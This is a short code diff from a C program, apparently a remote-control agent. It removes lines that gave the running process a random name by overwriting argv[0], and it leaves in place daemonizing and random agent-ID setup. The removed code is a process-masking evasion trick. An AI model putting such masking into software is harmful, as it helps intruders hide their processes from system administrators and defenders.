@@ -29,12 +29,6 @@ bool shaco_init(int argc, char **argv){
     daemonize();
 #endif
 
-    MSG("Generating Random Process Name");
-    if(argc > 0){
-        char *rstr = generate_random_str(10);
-        StringCopy(argv[0],rstr);
-        MSG("Current process name is: %s", rstr);
-    }
     MSG("Getting settings");
     PSETTINGS ps = get_settings();
     ps->agent_id = generate_random_int(1111, 999999);
